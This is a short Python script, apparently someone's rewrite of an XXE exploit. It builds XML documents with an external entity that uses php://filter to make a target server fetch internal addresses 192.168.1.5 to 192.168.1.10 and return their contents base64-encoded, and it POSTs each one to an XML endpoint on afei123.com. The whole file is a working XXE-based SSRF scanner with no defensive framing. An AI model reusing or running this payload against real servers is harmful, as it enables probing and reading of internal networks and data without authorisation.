#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
#Rewrite by afei

import requests

def xml_Payload(ip):
    xml = "<?xml version='1.0' encoding='UTF-8'?>\n"
    xml += "<!DOCTYPE root [\n"
    xml += "<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=http://%s/'>\n"%ip
    print(ip)
    xml += "]>\n"
    xml += "<root>&xxe;</root>"
    send_xml(xml)

def send_xml(data):
    urldata = requests.post("http://afei123.com:8090/xxe/xml.php", data=data, timeout=3).text
    print(urldata)

for i in range(5,11):
    try:
        ip = '192.168.1.%d'%i
        xml_Payload(ip)
    except:
        continue